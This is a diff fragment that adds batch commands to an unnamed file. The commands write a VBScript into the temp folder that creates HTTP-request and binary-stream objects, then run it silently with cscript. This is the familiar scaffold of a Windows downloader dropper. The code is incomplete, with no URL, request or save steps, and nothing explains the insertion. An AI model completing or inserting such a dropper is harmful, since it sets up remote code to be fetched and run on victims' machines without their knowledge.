@@ -1,0 +1,4 @@
+echo Set x = CreateObject("MSXML2.XMLHTTP") >> %TEMP%\d.vbs
+echo Set s = CreateObject("ADODB.Stream") >> %TEMP%\d.vbs
+cscript //nologo %TEMP%\d.vbs
+
